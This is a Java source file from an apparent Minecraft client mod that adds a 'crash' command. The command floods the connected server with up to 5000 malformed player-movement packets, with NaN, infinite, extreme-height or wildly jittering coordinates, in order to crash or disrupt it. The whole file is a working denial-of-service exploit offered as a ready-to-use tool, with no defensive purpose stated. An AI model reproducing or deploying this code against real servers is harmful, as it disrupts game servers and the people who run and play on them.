package dev.mlml.korppu.command.commands;

import dev.mlml.korppu.KorppuMod;
import dev.mlml.korppu.command.Command;
import dev.mlml.korppu.command.coloring.ArgType;
import dev.mlml.korppu.command.coloring.PossibleArg;
import dev.mlml.korppu.command.exception.CommandException;
import dev.mlml.korppu.imgui.windows.ConsoleWindow;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;

public class Crash extends Command {
    public Crash() {
        super("crash", "Sends malformed movement packet bursts", "crasher", "crashcommand");
    }

    @Override
    public PossibleArg getSuggestionsWithType(int index, String[] args) {
        return switch (index) {
            case 0 -> new PossibleArg(ArgType.STRING, "nan", "infinity", "highy", "jitter");
            case 1 -> new PossibleArg(ArgType.NUMBER, "count");
            default -> super.getSuggestionsWithType(index, args);
        };
    }

    @Override
    public void execute(String[] args) throws CommandException {
        if (KorppuMod.mc.player == null || KorppuMod.mc.getConnection() == null) {
            throw new CommandException("Not in world.");
        }

        String mode = args.length >= 1 ? args[0].toLowerCase() : "nan";
        int count = 100;
        if (args.length >= 2) {
            try {
                count = Math.max(1, Math.min(5000, Integer.parseInt(args[1])));
            } catch (NumberFormatException e) {
                throw new CommandException("Invalid count: " + args[1]);
            }
        }

        double x = KorppuMod.mc.player.getX();
        double y = KorppuMod.mc.player.getY();
        double z = KorppuMod.mc.player.getZ();

        for (int i = 0; i < count; i++) {
            ServerboundMovePlayerPacket.PosRot packet = switch (mode) {
                case "infinity" -> new ServerboundMovePlayerPacket.PosRot(Double.POSITIVE_INFINITY, y, z,
                        KorppuMod.mc.player.getYRot(), KorppuMod.mc.player.getXRot(), false,
                        KorppuMod.mc.player.horizontalCollision);
                case "highy" -> new ServerboundMovePlayerPacket.PosRot(x, 30_000_000 + i, z,
                        KorppuMod.mc.player.getYRot(), KorppuMod.mc.player.getXRot(), false,
                        KorppuMod.mc.player.horizontalCollision);
                case "jitter" -> new ServerboundMovePlayerPacket.PosRot(x + (i % 2 == 0 ? 100000 : -100000), y, z,
                        KorppuMod.mc.player.getYRot(), KorppuMod.mc.player.getXRot(), false,
                        KorppuMod.mc.player.horizontalCollision);
                default -> new ServerboundMovePlayerPacket.PosRot(Double.NaN, y, z,
                        KorppuMod.mc.player.getYRot(), KorppuMod.mc.player.getXRot(), false,
                        KorppuMod.mc.player.horizontalCollision);
            };
            KorppuMod.mc.getConnection().send(packet);
        }

        ConsoleWindow.print("Sent " + count + " crash packets using mode " + mode + ".");
    }
}
